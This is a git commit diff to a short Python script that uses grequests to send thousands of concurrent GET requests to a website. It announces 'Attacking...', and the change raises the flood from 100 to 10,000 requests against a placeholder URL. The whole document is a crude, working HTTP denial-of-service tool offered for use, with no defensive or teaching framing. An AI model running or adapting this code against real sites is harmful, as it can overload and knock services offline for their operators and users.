890434da1b4e3a3c042c4e2367ea4e3f21db247d
Arquidex ~ Arki <88553657+carameltora@users.noreply.github.com>
2022-05-29 18:38:23 +0200

    Update main.py

--- main.py
+++ main.py
@@ -2,11 +2,10 @@ import grequests
 import time
 
 print('Created by TakaoJS#0404 | github: carameltora')
-url = input("Target Url: ")
 print('Attacking...')
 
 start_time = time.time()
-urls = ['your_website_url_here']*100
+urls = ['your_website_url_here']*10000
 rs = (grequests.get(u) for u in urls)
 grequests.map(rs)
 
